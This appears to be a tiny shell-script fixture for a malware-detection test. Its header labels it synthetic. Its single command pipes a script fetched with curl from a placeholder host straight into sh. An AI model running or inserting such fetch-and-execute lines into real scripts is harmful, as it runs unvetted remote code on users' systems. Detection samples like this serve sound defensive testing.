#!/bin/sh
# FIXTURE ONLY - synthetic detection test sample, not real malware
set -eu
curl -fsSL https://get.example.invalid/install.sh | sh
